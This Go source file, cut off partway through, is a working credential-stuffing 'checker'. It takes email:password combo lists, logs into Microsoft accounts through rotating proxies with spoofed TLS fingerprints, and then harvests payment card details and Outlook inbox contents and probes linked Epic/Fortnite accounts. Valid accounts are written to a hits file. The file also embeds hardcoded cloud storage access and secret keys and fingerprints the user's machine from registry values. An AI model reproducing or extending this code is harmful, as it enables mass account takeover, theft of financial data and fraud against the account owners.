package main

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	http "github.com/bogdanfinn/fhttp"
	tls_client "github.com/bogdanfinn/tls-client"
	"github.com/bogdanfinn/tls-client/profiles"
	"io"
	"net"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	stdhttp "net/http"

	"github.com/jchv/go-webview2"
)

const (
	XboxAuthPreflight      = "https://login.live.com/oauth20_authorize.srf?redirect_uri=https://sisu.xboxlive.com/connect/oauth/XboxLive&response_type=code&client_id=000000004420578E&scope=XboxLive.Signin%20+XboxLive.offline_access&lw=1&fl=dob,easi2&xsup=1&nopa=2"
	XboxLoginPost          = "https://login.live.com/ppsecure/post.srf?nopa=2&client_id=000000004420578E"
	XboxOAuthAuthorize     = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&prompt=none"
	PaymentInstrumentsURL  = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
	PaymentTransactionsURL = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"

	// Outlook / inbox search (adapted from the provided OpenBullet config)
	OutlookTokenURL  = "https://login.live.com/oauth20_token.srf"
	OutlookSearchURL = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
	OutlookClientID  = "0000000048170EF2"
	OutlookScope     = "https://substrate.office.com/User-Internal.ReadWrite"
	OutlookRedirect  = "https://login.live.com/oauth20_desktop.srf"

	// Epic / Fortnite (from the provided Fortnite Hotmail config)
	EpicReputationURL = "https://www.epicgames.com/id/api/reputation"
	EpicXBLLoginURL   = "https://www.epicgames.com/id/api/external/xbl/login"
	EpicRedirectURL   = "https://www.epicgames.com/id/api/redirect?"
	EpicLauncherAuth  = "basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y="
	EpicFortniteAuth  = "basic ZWM2ODRiOGM2ODdmNDc5ZmFkZWEzY2IyYWQ4M2Y1YzY6ZTFmMzFjMjExZjI4NDEzMTg2MjYyZDM3YTEzZmM4NGQ="
)

const sessionsDir = "sessions"
const sessionsPerPage = 5
const dailyEnvFile = ".env"

const (
	AppVersion         = "1.0.8"
	r2EndpointHost     = "30eb01bfd5ca05f0b5bf5e9acfe67bab.r2.cloudflarestorage.com"
	r2AccessKey        = "705190a241bba3f397b00f7eb1efceaf"
	r2SecretKey        = "9b609b3ff870a9fb158e7975eacea2970f9fa1273601ce0d577c5b87a6900202"
	r2WriteAccessKey   = "66822e3237a884097f4a57a568cc37a8"
	r2WriteSecretKey   = "eae80ff80f184f30339f2e372b2866e79b15eb51382dfcae8978f181165f81e3"
	r2Bucket           = "solo-checker"
	r2ManifestKey      = "manifest.json"
	r2ExeKey           = "xbox-checker.exe"
	r2UsersPrefix      = "users/"
	defaultDailyLimit  = 10000
)

var (
	quotaMu      sync.Mutex
	quotaDate    string
	quotaCount   int
	quotaLoaded  bool
	dailyLimit   = defaultDailyLimit
	machineIDVal string
	flushTimer   *time.Timer
	flushing     int32
	flushDirty   int32

	reEditorEmail = regexp.MustCompile(`(?i)[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,24}`)
	reEditorHost  = regexp.MustCompile(`(?i)(?:https?://|android://)?(?:www\.)?([a-z0-9\-]+(?:\.[a-z0-9\-]+)+)`)
	reProxyHost   = regexp.MustCompile(`(?i)(?:(?:https?|socks[45]h?)://)?(?:[^\s:@]+(?::[^\s@]*)?@)?((?:\d{1,3}\.){3}\d{1,3}|[a-z0-9._\-]+):(\d{2,5})`)
)

func todayStamp() string {
	return time.Now().Format("2006-01-02")
}

func quotaKey() []byte {
	sum := sha256.Sum256([]byte("xbox-checker/daily-quota/v1"))
	return sum[:]
}

func sealQuota(date string, count int) string {
	block, err := aes.NewCipher(quotaKey())
	if err != nil {
		return ""
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return ""
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return ""
	}
	plain := []byte(fmt.Sprintf("%s|%d", date, count))
	out := gcm.Seal(nonce, nonce, plain, nil)
	return base64.StdEncoding.EncodeToString(out)
}

func openQuota(blob string) (string, int, bool) {
	raw, err := base64.StdEncoding.DecodeString(strings.TrimSpace(blob))
	if err != nil {
		return "", 0, false
	}
	block, err := aes.NewCipher(quotaKey())
	if err != nil {
		return "", 0, false
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", 0, false
	}
	ns := gcm.NonceSize()
	if len(raw) < ns {
		return "", 0, false
	}
	plain, err := gcm.Open(nil, raw[:ns], raw[ns:], nil)
	if err != nil {
		return "", 0, false
	}
	parts := strings.SplitN(string(plain), "|", 2)
	if len(parts) != 2 {
		return "", 0, false
	}
	n := 0
	fmt.Sscanf(parts[1], "%d", &n)
	if n < 0 {
		n = 0
	}
	return parts[0], n, true
}

func dropLocalEnv() {
	_ = os.Remove(dailyEnvFile)
	_ = os.Remove(".env")
}

func persistQuotaLocked() {
	scheduleCloudFlushLocked()
}

func loadQuotaLocked() {
	if quotaLoaded && quotaDate == todayStamp() {
		return
	}
	today := todayStamp()
	if quotaDate != today {
		quotaCount = 0
	}
	quotaDate = today
	quotaLoaded = true
}

func rollQuotaDayLocked() {
	loadQuotaLocked()
	today := todayStamp()
	if quotaDate != today {
		quotaDate = today
		quotaCount = 0
		scheduleCloudFlushLocked()
	}
}

func dailyUsed() int {
	quotaMu.Lock()
	defer quotaMu.Unlock()
	rollQuotaDayLocked()
	return quotaCount
}

func quotaAtLimit() bool {
	return dailyUsed() >= dailyLimit
}

func addDailyValid() int {
	quotaMu.Lock()
	defer quotaMu.Unlock()
	rollQuotaDayLocked()
	if quotaCount < dailyLimit {
		quotaCount++
		scheduleCloudFlushLocked()
	}
	return quotaCount
}

func windowsRegValue(key, name string) string {
	if runtime.GOOS != "windows" {
		return ""
	}
	out, err := exec.Command("reg", "query", key, "/v", name).Output()
	if err != nil {
		return ""
	}
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimSpace(line)
		if !strings.Contains(strings.ToLower(line), strings.ToLower(name)) {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) >= 3 {
			return parts[len(parts)-1]
		}
	}
	return ""
}

func systemMachineID() string {
	if machineIDVal != "" {
		return machineIDVal
	}
	guid := windowsRegValue(`HKLM\SOFTWARE\Microsoft\Cryptography`, "MachineGuid")
	prod := windowsRegValue(`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion`, "ProductId")
	host, _ := os.Hostname()
	raw := strings.ToLower(strings.TrimSpace(guid) + "|" + strings.TrimSpace(prod) + "|" + strings.TrimSpace(host))
	if strings.Trim(raw, "|") == "" {
		raw = "solo|" + host
	}
	sum := sha256.Sum256([]byte("solo-checker/machine/" + raw))
	hexid := strings.ToUpper(hex.EncodeToString(sum[:8]))
	machineIDVal = hexid[:4] + "-" + hexid[4:8] + "-" + hexid[8:12] + "-" + hexid[12:]
	return machineIDVal
}

type userCloudQuota struct {
	ID      string `json:"id"`
	Limit   int    `json:"daily_limit"`
	Date    string `json:"date"`
	Used    int    `json:"used"`
	Updated int64  `json:"updated"`
}

func userObjectKey() string {
	return r2UsersPrefix + systemMachineID() + ".json"
}

func scheduleCloudFlushLocked() {
	atomic.StoreInt32(&flushDirty, 1)
	if !atomic.CompareAndSwapInt32(&flushing, 0, 1) {
		return
	}
	go func() {
		defer atomic.StoreInt32(&flushing, 0)
		for {
			atomic.StoreInt32(&flushDirty, 0)
			quotaMu.Lock()
			snap := userCloudQuota{
				ID:      systemMachineID(),
				Limit:   dailyLimit,
				Date:    quotaDate,
				Used:    quotaCount,
				Updated: time.Now().Unix(),
			}
			quotaMu.Unlock()
			b, err := json.Marshal(snap)
			if err != nil {
				return
			}
			_ = r2Put(userObjectKey(), b, "application/json")
			if atomic.LoadInt32(&flushDirty) == 0 {
				return
			}
		}
	}()
}

func pullQuotaFromCloud() {
	dropLocalEnv()
	id := systemMachineID()
	today := todayStamp()
	b, err := r2Get(userObjectKey())
	if err != nil {
		quotaMu.Lock()
		quotaDate = today
		quotaLoaded = true
		snap := userCloudQuota{ID: id, Limit: dailyLimit, Date: today, Used: quotaCount, Updated: time.Now().Unix()}
		quotaMu.Unlock()
		raw, _ := json.Marshal(snap)
		_ = r2Put(userObjectKey(), raw, "application/json")
		return
	}
	var remote userCloudQuota
	if json.Unmarshal(b, &remote) != nil {
		return
	}
	quotaMu.Lock()
	if remote.Limit > 0 {
		dailyLimit = remote.Limit
	}
	if remote.Date == today {
		quotaDate = today
		quotaCount = remote.Used
		if quotaCount < 0 {
			quotaCount = 0
		}
	} else {
		quotaDate = today
		quotaCount = 0
	}
	quotaLoaded = true
	quotaMu.Unlock()
	if remote.Date != today {
		scheduleCloudFlushLocked()
	}
}

func nextResetTime() time.Time {
	now := time.Now()
	return time.Date(now.Year(), now.Month(), now.Day()+1, 0, 0, 0, 0, now.Location())
}

func limitMessage() string {
	reset := nextResetTime()
	return fmt.Sprintf("Daily valid limit reached (%d). Continue when your daily limit refreshes at %s (%s).",
		dailyLimit, reset.Format("3:04 PM"), reset.Format("2006-01-02"))
}

type LineRange struct {
	From int `json:"from"`
	To   int `json:"to"`
}

type Session struct {
	ComboPath     string              `json:"combo_path"`
	ProxyInput    string              `json:"proxy_input"`
	KeywordsInput string              `json:"keywords_input"`
	Workers       int                 `json:"workers"`
	DoneRanges    []LineRange         `json:"done_ranges"`
	RetryLines    []int               `json:"retry_lines"`
	RetryCounts   map[string]int      `json:"retry_counts"`
	TriedProxies  map[string][]string `json:"tried_proxies"`
	UpdatedAt     string              `json:"updated_at"`
	StartedAt     string              `json:"started_at"`
	File          string              `json:"file,omitempty"`
	CapKeywords   bool                `json:"cap_keywords"`
	CapPayments   bool                `json:"cap_payments"`
	CapPromos     bool                `json:"cap_promos"`
	CapFortnite   bool                `json:"cap_fortnite"`
	CapturesSet   bool                `json:"captures_set"`
}

type Config struct {
	ComboPath     string
	ProxyInput    string
	KeywordsInput string
	Proxies       []string // empty = no proxy; supports single proxy or list loaded from .txt
	Workers       int
	Keywords      []string // keywords to search in each inbox
	CapKeywords   bool
	CapPayments   bool
	CapPromos     bool
	CapFortnite   bool
	Session       *Session
	sessMu        *sync.Mutex
}

type ProgressEvent struct {
	IsValid    bool
	Hit        string
	LogMsg     string
	IsDone     bool
	IsRetry    bool // true when an account was queued for retry
	RetryDelta int
	Daily      int
	LimitHit   bool
}

func loadSession() (*Session, error) {
	list := listSessions()
	if len(list) == 0 {
		return nil, os.ErrNotExist
	}
	best := list[0]
	for _, s := range list[1:] {
		if s.UpdatedAt > best.UpdatedAt {
			best = s
		}
	}
	return &best, nil
}

var lastSessionFlush time.Time

func saveSession(s *Session) {
	saveSessionAt(s, false)
}

func saveSessionAt(s *Session, force bool) {
	if s == nil {
		return
	}
	if !force && time.Since(lastSessionFlush) < 2*time.Second {
		return
	}
	lastSessionFlush = time.Now()
	s.UpdatedAt = time.Now().Format("2006-01-02 15:04:05")
	if s.File == "" || !strings.HasPrefix(s.File, sessionsDir) {
		_ = os.MkdirAll(sessionsDir, 0755)
		base := filepath.Base(s.ComboPath)
		if base == "" || base == "." {
			base = "session"
		}
		s.File = filepath.Join(sessionsDir, fmt.Sprintf("%s-%s.json", strings.TrimSuffix(base, filepath.Ext(base)), time.Now().Format("20060102-150405")))
	}
	b, err := json.MarshalIndent(s, "", "  ")
	if err != nil {
		return
	}
	_ = os.MkdirAll(sessionsDir, 0755)
	_ = os.WriteFile(s.File, b, 0644)
}

func deleteSession(s *Session) {
	if s == nil || s.File == "" {
		return
	}
	_ = os.Remove(s.File)
}

func listSessions() []Session {
	var out []Session
	seen := map[string]bool{}
	add := func(path string) {
		b, err := os.ReadFile(path)
		if err != nil {
			return
		}
		var s Session
		if json.Unmarshal(b, &s) != nil {
			return
		}
		if s.ComboPath == "" {
			return
		}
		s.File = path
		key := s.ComboPath + "|" + s.StartedAt + "|" + s.UpdatedAt
		if seen[key] {
			return
		}
		seen[key] = true
		out = append(out, s)
	}
	if entries, err := os.ReadDir(sessionsDir); err == nil {
		for _, e := range entries {
			if e.IsDir() || !strings.HasSuffix(strings.ToLower(e.Name()), ".json") {
				continue
			}
			add(filepath.Join(sessionsDir, e.Name()))
		}
	}
	return out
}

func lineKey(n int) string { return fmt.Sprintf("%d", n) }

func rangeHas(ranges []LineRange, n int) bool {
	for _, r := range ranges {
		if n >= r.From && n <= r.To {
			return true
		}
	}
	return false
}

func addDoneRange(ranges []LineRange, n int) []LineRange {
	if n <= 0 || rangeHas(ranges, n) {
		return ranges
	}
	ranges = append(ranges, LineRange{From: n, To: n})
	// sort + merge
	for i := 0; i < len(ranges); i++ {
		for j := i + 1; j < len(ranges); j++ {
			if ranges[j].From < ranges[i].From {
				ranges[i], ranges[j] = ranges[j], ranges[i]
			}
		}
	}
	out := make([]LineRange, 0, len(ranges))
	for _, r := range ranges {
		if len(out) == 0 {
			out = append(out, r)
			continue
		}
		last := &out[len(out)-1]
		if r.From <= last.To+1 {
			if r.To > last.To {
				last.To = r.To
			}
			continue
		}
		out = append(out, r)
	}
	return out
}

func removeRetryLine(lines []int, n int) []int {
	out := lines[:0]
	for _, l := range lines {
		if l != n {
			out = append(out, l)
		}
	}
	return out
}

func markLineDone(cfg *Config, line int) {
	if cfg == nil || cfg.Session == nil || cfg.sessMu == nil || line <= 0 {
		return
	}
	cfg.sessMu.Lock()
	defer cfg.sessMu.Unlock()
	cfg.Session.DoneRanges = addDoneRange(cfg.Session.DoneRanges, line)
	cfg.Session.RetryLines = removeRetryLine(cfg.Session.RetryLines, line)
	k := lineKey(line)
	if cfg.Session.RetryCounts != nil {
		delete(cfg.Session.RetryCounts, k)
	}
	if cfg.Session.TriedProxies != nil {
		delete(cfg.Session.TriedProxies, k)
	}
	saveSession(cfg.Session)
}

func markLinePending(cfg *Config, line int, tries int, used map[string]struct{}) {
	if cfg == nil || cfg.Session == nil || cfg.sessMu == nil || line <= 0 {
		return
	}
	cfg.sessMu.Lock()
	defer cfg.sessMu.Unlock()
	found := false
	for _, l := range cfg.Session.RetryLines {
		if l == line {
			found = true
			break
		}
	}
	if !found {
		cfg.Session.RetryLines = append(cfg.Session.RetryLines, line)
	}
	if cfg.Session.RetryCounts == nil {
		cfg.Session.RetryCounts = map[string]int{}
	}
	cfg.Session.RetryCounts[lineKey(line)] = tries
	if cfg.Session.TriedProxies == nil {
		cfg.Session.TriedProxies = map[string][]string{}
	}
	var plist []string
	for p := range used {
		plist = append(plist, p)
	}
	cfg.Session.TriedProxies[lineKey(line)] = plist
	saveSession(cfg.Session)
}

func packWork(line int, combo string) string {
	return fmt.Sprintf("%d\x00%s", line, combo)
}

func unpackWork(s string) (int, string) {
	if i := strings.IndexByte(s, 0); i > 0 {
		var n int
		fmt.Sscanf(s[:i], "%d", &n)
		return n, s[i+1:]
	}
	return 0, s
}

func sendProgress(ch chan ProgressEvent, ev ProgressEvent) {
	if ch == nil {
		return
	}
	select {
	case ch <- ev:
	default:
	}
}

func runCheckerEngine(cfg Config, progressChan chan ProgressEvent) {
	file, err := os.Open(cfg.ComboPath)
	if err != nil {
		sendProgress(progressChan, ProgressEvent{LogMsg: fmt.Sprintf("[FATAL] Combo file error: %v", err)})
		close(progressChan)
		return
	}
	defer file.Close()

	// Unlimited retries: soft-fails (proxy/preflight/network/etc.) go back into the
	// work queue and keep being retried with the next proxy until they succeed
	// or hit a hard failure (wrong credentials). There is no retry limit.
	workCh := make(chan string, 4096)
	var (
		pending    int64
		fileDone   int32
		firstLeft  int64
		retryPhase int32
		dailyStop  int32
	)
	var retryMu sync.Mutex
	retryBuf := make([]string, 0, 256)
	// Only this feeder sends retries onto workCh. Workers never send to workCh
	// (that deadlocks when every worker retries at once and the buffer is full).
	pumpRetries := func(n int) {
		for i := 0; i < n; i++ {
			retryMu.Lock()
			if len(retryBuf) == 0 {
				retryMu.Unlock()
				return
			}
			item := retryBuf[0]
			retryBuf = retryBuf[1:]
			retryMu.Unlock()
			select {
			case workCh <- item:
			default:
				retryMu.Lock()
				retryBuf = append([]string{item}, retryBuf...)
				retryMu.Unlock()
				return
			}
		}
	}

	// Track which combos are currently counted in the UI "Retries" number
	// so we only +1 the first time they soft-fail, and -1 when finally resolved.
	inRetry := sync.Map{}    // combo -> struct{}
	retryCount := sync.Map{} // combo -> int
	triedProxy := sync.Map{} // combo -> map[string]struct{}
	// Cap proxy attempts. Walking the whole list made 7k accounts take hours.
	maxProxyTries := 3
	if len(cfg.Proxies) > 0 && len(cfg.Proxies) < maxProxyTries {
		maxProxyTries = len(cfg.Proxies)
	}

	retryWant := map[int]bool{}
	if cfg.Session != nil {
		for k, n := range cfg.Session.RetryCounts {
			retryCount.Store(k, n)
		}
		for k, plist := range cfg.Session.TriedProxies {
			used := map[string]struct{}{}
			for _, p := range plist {
				used[p] = struct{}{}
			}
			triedProxy.Store(k, used)
		}
		for _, ln := range cfg.Session.RetryLines {
			retryWant[ln] = true
		}
	}

	go func() {
		scanner := bufio.NewScanner(file)
		idx := 0
		for scanner.Scan() {
			raw := strings.TrimSpace(scanner.Text())
			if raw == "" {
				continue
			}
			idx++
			if retryWant[idx] {
				inRetry.Store(lineKey(idx), struct{}{})
				atomic.AddInt64(&pending, 1)
				retryMu.Lock()
				retryBuf = append(retryBuf, packWork(idx, raw))
				retryMu.Unlock()
				guiMu.Lock()
				guiTotal++
				guiMu.Unlock()
				sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: 1})
				continue
			}
			if cfg.Session != nil && rangeHas(cfg.Session.DoneRanges, idx) {
				continue
			}
			atomic.AddInt64(&pending, 1)
			atomic.AddInt64(&firstLeft, 1)
			guiMu.Lock()
			guiTotal++
			guiMu.Unlock()
			workCh <- packWork(idx, raw)
		}
		atomic.StoreInt32(&fileDone, 1)
	}()

	go func() {
		for {
			pumpRetries(cfg.Workers * 2)
			if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&firstLeft) <= 0 {
				atomic.StoreInt32(&retryPhase, 1)
			}
			if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&guiStop) == 1 {
				return
			}
			if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&pending) <= 0 {
				return
			}
			time.Sleep(20 * time.Millisecond)
		}
	}()

	// Workers keep running until everything is resolved
	var wg sync.WaitGroup
	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			wfp := newWorkerFP(workerID)
			for {
				// Exit condition: file fully loaded and nothing left pending
				if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&guiStop) == 1 {
					return
				}
				if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&pending) <= 0 {
					return
				}

				var raw string
				select {
				case raw = <-workCh:
				case <-time.After(100 * time.Millisecond):
					continue
				}
				for atomic.LoadInt32(&guiPaused) == 1 {
					if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&guiStop) == 1 {
						return
					}
					time.Sleep(200 * time.Millisecond)
				}
				lineNo, combo := unpackWork(raw)
				lk := lineKey(lineNo)

				parts := strings.SplitN(combo, ":", 2)
				if len(parts) != 2 {
					sendProgress(progressChan, ProgressEvent{LogMsg: fmt.Sprintf("[WARN] Malformed combo: %s", combo)})
					if _, loaded := inRetry.LoadAndDelete(lk); loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
					}
					markLineDone(&cfg, lineNo)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					atomic.AddInt64(&pending, -1)
					continue
				}
				email, password := parts[0], parts[1]

				if atomic.LoadInt32(&guiStop) == 1 {
					return
				}
				if atomic.LoadInt32(&dailyStop) == 1 || quotaAtLimit() {
					if atomic.CompareAndSwapInt32(&dailyStop, 0, 1) {
						sendProgress(progressChan, ProgressEvent{LimitHit: true, Daily: dailyUsed(), LogMsg: limitMessage()})
					}
					retryMu.Lock()
					retryBuf = append(retryBuf, packWork(lineNo, combo))
					retryMu.Unlock()
					continue
				}

				// Round-robin next proxy (different proxy on every attempt)
				proxyStr := ""
				if len(cfg.Proxies) > 0 {
					proxyStr = takeLiveProxy("check", cfg.Proxies)
				}

				formattedHit, valid, logMsg, shouldRetry := executeAccountValidation(email, password, proxyStr, cfg.Proxies, cfg.Keywords, wfp, cfg)

				if valid {
					used := addDailyValid()
					appendResultToFile("valid.txt", formattedHit)
					sendProgress(progressChan, ProgressEvent{IsValid: true, Hit: formattedHit, LogMsg: logMsg, Daily: used})
					if used >= dailyLimit {
						if atomic.CompareAndSwapInt32(&dailyStop, 0, 1) {
							sendProgress(progressChan, ProgressEvent{LimitHit: true, Daily: used, LogMsg: limitMessage()})
						}
					}
					if _, loaded := inRetry.LoadAndDelete(lk); loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
					}
					markLineDone(&cfg, lineNo)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					atomic.AddInt64(&pending, -1)
					continue
				}

				if shouldRetry {
					n := 1
					if v, ok := retryCount.Load(lk); ok {
						n = v.(int) + 1
					}
					retryCount.Store(lk, n)
					used := map[string]struct{}{}
					if v, ok := triedProxy.Load(lk); ok {
						if m, ok := v.(map[string]struct{}); ok {
							used = m
						}
					}
					if proxyStr != "" {
						used[proxyStr] = struct{}{}
					}
					triedProxy.Store(lk, used)
					donePool := len(cfg.Proxies) > 0 && len(used) >= len(cfg.Proxies)
					if n >= maxProxyTries || donePool {
						if _, loaded := inRetry.LoadAndDelete(lk); loaded {
							sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
						}
						markLineDone(&cfg, lineNo)
						if atomic.LoadInt32(&retryPhase) == 0 {
							atomic.AddInt64(&firstLeft, -1)
						}
						atomic.AddInt64(&pending, -1)
						continue
					}
					if _, loaded := inRetry.LoadOrStore(lk, struct{}{}); !loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: 1})
					}
					markLinePending(&cfg, lineNo, n, used)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					retryMu.Lock()
					retryBuf = append(retryBuf, packWork(lineNo, combo))
					retryMu.Unlock()
					continue
				}

				if logMsg != "" {
					sendProgress(progressChan, ProgressEvent{LogMsg: logMsg})
				} else {
					sendProgress(progressChan, ProgressEvent{IsValid: false})
				}
				if _, loaded := inRetry.LoadAndDelete(lk); loaded {
					sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
				}
				markLineDone(&cfg, lineNo)
				if atomic.LoadInt32(&retryPhase) == 0 {
					atomic.AddInt64(&firstLeft, -1)
				}
				atomic.AddInt64(&pending, -1)
			}
		}(i)
	}

	wg.Wait()
	if atomic.LoadInt32(&guiStop) == 1 {
		saveSessionAt(cfg.Session, true)
	} else if atomic.LoadInt32(&dailyStop) == 0 {
		deleteSession(cfg.Session)
	} else {
		saveSessionAt(cfg.Session, true)
	}
	sendProgress(progressChan, ProgressEvent{IsDone: true})
	close(progressChan)
}

// Returns: formattedHit, isValid, logMsg, shouldRetry
func executeAccountValidation(email, password, proxyStr string, proxies []string, keywords []string, wfp *workerFP, cfg Config) (string, bool, string, bool) {
	if wfp == nil {
		wfp = newWorkerFP(0)
	}
	preset := wfp.nextPreset()
	client, oauthClient := newTLSClientPairProfile(proxyStr, 5*time.Second, 5*time.Second, preset.profile)
	if client == nil {
		return "", false, "", true
	}
	ua := preset.ua
	profile := preset.profile

	reqInit, err := http.NewRequest("GET", XboxAuthPreflight, nil)
	if err != nil {
		return "", false, "", true // soft – retry
	}
	reqInit.Header.Set("User-Agent", ua)

	respInit, err := doReq(client, reqInit)
	if err != nil {
		return "", false, "", true // network / preflight – retry
	}
	bodyInitBytes, _ := io.ReadAll(respInit.Body)
	respInit.Body.Close()
	ppft := extractPPFT(string(bodyInitBytes))

	if ppft == "" {
		return "", false, "", true // PPFT fail – retry
	}

	loginData := url.Values{}
	loginData.Set("i13", "0")
	loginData.Set("login", email)
	loginData.Set("loginfmt", email)
	loginData.Set("type", "11")
	loginData.Set("LoginOptions", "3")
	loginData.Set("passwd", password)
	loginData.Set("ps", "2")
	loginData.Set("PPFT", ppft)
	loginData.Set("NewUser", "1")
	loginData.Set("IsFidoSupported", "1")
	loginData.Set("i19", "36463")

	reqPost, err := http.NewRequest("POST", XboxLoginPost, strings.NewReader(loginData.Encode()))
	if err != nil {
		return "", false, "", true
	}
	reqPost.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqPost.Header.Set("Origin", "https://login.live.com")
	reqPost.Header.Set("Referer", XboxAuthPreflight)

	respPost, err := doReq(client, reqPost)
	if err != nil {
		return "", false, "", true // POST network – retry
	}
	defer respPost.Body.Close()
	bodyBytes, _ := io.ReadAll(respPost.Body)
	bodyStr := string(bodyBytes)

	if strings.Contains(bodyStr, "Your account or password is incorrect") ||
		strings.Contains(bodyStr, "That Microsoft account doesn't exist") {
		// Hard fail – do not retry
		return "", false, fmt.Sprintf("[%s] INVALID: Credentials incorrect.", email), false
	}

	if strings.Contains(bodyStr, "Sign in to your Microsoft account") && strings.Contains(bodyStr, "proof") {
		// Extra proof / challenge – discard, do not retry
		return "", false, "", false
	}

	reqAuth, err := http.NewRequest("GET", XboxOAuthAuthorize, nil)
	if err != nil {
		return "", false, "", true
	}

	if oauthClient == nil {
		oauthClient = newTLSClientProfile(proxyStr, 5*time.Second, false, profile)
		if oauthClient == nil {
			return "", false, "", true
		}
		oauthClient.SetCookieJar(client.GetCookieJar())
	}

	respAuth, err := doReq(oauthClient, reqAuth)
	if err != nil {
		return "", false, "", true // OAuth network – retry
	}
	defer respAuth.Body.Close()

	loc := respAuth.Header.Get("Location")
	atk := extractParameter(loc, "access_token=")

	if atk == "" {
		// Soft – try the next proxy (capped to one pass through the list)
		return "", false, "", true
	}

	// Fetch Payment Instruments & Transactions
	reqPay, err := http.NewRequest("GET", PaymentInstrumentsURL, nil)
	var payStr string
	if err == nil {
		reqPay.Header.Set("Authorization", fmt.Sprintf("MSADELEGATE1.0=\"%s\"", atk))
		reqPay.Header.Set("Accept", "application/json")
		if respPay, err := doReq(client, reqPay); err == nil {
			defer respPay.Body.Close()
			payBytes, _ := io.ReadAll(respPay.Body)
			payStr = string(payBytes)
		}
	}
	if !cfg.CapPayments {
		payStr = ""
	}

	countryCode := parseBetween(payStr, "country\":\"", "\"")
	if countryCode == "" {
		countryCode = "US"
	}
	countryName := translateCountry(countryCode)

	var cashStrs []string
	var nonCashActive []string
	var removedMethods []string
	var rawJSON interface{}
	if err := json.Unmarshal([]byte(payStr), &rawJSON); err == nil {
		var list []interface{}
		switch v := rawJSON.(type) {
		case []interface{}:
			list = v
		case map[string]interface{}:
			for _, key := range []string{"instrumentList", "paymentInstruments", "instruments", "value"} {
				if arr, ok := v[key].([]interface{}); ok {
					list = arr
					break
				}
			}
			if len(list) == 0 {
				list = []interface{}{v}
			}
		}

		asString := func(v interface{}) string {
			switch t := v.(type) {
			case string:
				return strings.TrimSpace(t)
			case float64:
				if t == float64(int64(t)) {
					return fmt.Sprintf("%d", int64(t))
				}
				return strings.TrimSpace(fmt.Sprintf("%v", t))
			case json.Number:
				return t.String()
			case int:
				return fmt.Sprintf("%d", t)
			default:
				return ""
			}
		}

		brandFromType := func(pmType string) string {
			switch strings.ToLower(strings.TrimSpace(pmType)) {
			case "visa":
				return "Visa"
			case "mc", "mastercard", "master_card":
				return "MasterCard"
			case "amex", "americanexpress", "american_express":
				return "Amex"
			case "discover":
				return "Discover"
			case "jcb":
				return "JCB"
			case "diners", "dinersclub", "diners_club":
				return "Diners"
			case "unionpay", "union_pay":
				return "UnionPay"
			case "maestro":
				return "Maestro"
			default:
				return ""
			}
		}

		for _, item := range list {
			if obj, ok := item.(map[string]interface{}); ok {
				instrType, _ := obj["instrumentType"].(string)
				status, _ := obj["status"].(string)

				var brand, last4, expMonth, expYear, ppEmail, pmType, displayName string

				if pm, ok := obj["paymentMethod"].(map[string]interface{}); ok {
					pmType, _ = pm["paymentMethodType"].(string)
					if instrType == "" {
						instrType = pmType
					}
					if disp, ok := pm["display"].(map[string]interface{}); ok {
						displayName, _ = disp["name"].(string)
					}
				}

				if details, ok := obj["details"].(map[string]interface{}); ok {
					brand = asString(details["brand"])
					last4 = asString(details["lastFourDigits"])
					if last4 == "" {
						last4 = asString(details["last4"])
					}
					expMonth = asString(details["expiryMonth"])
					expYear = asString(details["expiryYear"])
					ppEmail = asString(details["email"])
				}

				if brand == "" {
					brand = asString(obj["brand"])
				}
				if brand == "" {
					brand = strings.TrimSpace(displayName)
				}
				if brand == "" {
					brand = brandFromType(pmType)
				}
				if last4 == "" {
					last4 = asString(obj["lastFourDigits"])
				}
				if expMonth == "" {
					expMonth = asString(obj["expiryMonth"])
				}
				if expYear == "" {
					expYear = asString(obj["expiryYear"])
				}
				if ppEmail == "" {
					ppEmail = asString(obj["email"])
				}

				isRemoved := strings.EqualFold(status, "removed")
